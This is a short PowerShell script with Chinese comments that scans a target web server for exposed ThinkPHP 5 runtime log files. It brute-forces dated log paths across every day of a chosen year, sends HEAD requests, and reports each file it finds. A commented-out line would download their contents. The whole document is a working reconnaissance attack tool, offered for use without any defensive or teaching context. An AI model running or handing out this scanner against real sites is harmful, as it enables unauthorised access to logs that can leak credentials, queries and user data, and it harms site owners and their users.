$url = "http://192.168.23.121:8090"; #目标网站
$log = "/runtime/log/"; #一般在根目录下，注意大小写。
$stime = 2021; #开始时间，2017年写2017
$etime = 2021; #结束时间，2018年写2018

$url = $url + $log;


function check_remote_file_exists($url) {
	try {
                $res = Invoke-WebRequest -Method Head -Uri $url;
				echo $url;
                return $true;
            }
            catch {
				return $false;
			}
}

function file_get_contents($url) {
	return Invoke-WebRequest -Uri $url;
}


for ($i = $stime; $i -le $etime; $i++) {
	#1月到12月
	for ($j = 1; $j -le 12; $j++) {
		#1号到31号
		for ($d = 1; $d -le 31; $d++) {
			#tp5 Log格式：201801/30.log
			$log = ("{0}{1:d2}/{2:d2}" -f $i,$j,$d) + ".log";
			if (check_remote_file_exists($url + $log)) {
				# out-file -FilePath $log -inputobject (file_get_contents ($url + $log));
				echo "Found out:$($url)$($log)";
			} else {
                $log = ("{0}{1:d2}/{2:d2}" -f $i,$j,$d) + "_error.log";
                if(check_remote_file_exists($url + $log)) {
                    echo "Found out:$($url)$($log)";
                } else {
                    $log = ("{0}_{1:d2}_{2:d2}" -f $i,$j,$d).Substring(2,8) + ".log";
                    if(check_remote_file_exists($url + $log)) {
                        echo "Found out:$($url)$($log)";
                    } else {
                        # echo "$log isn't exists\n";
                    }
                }
			}
		}
	}
}
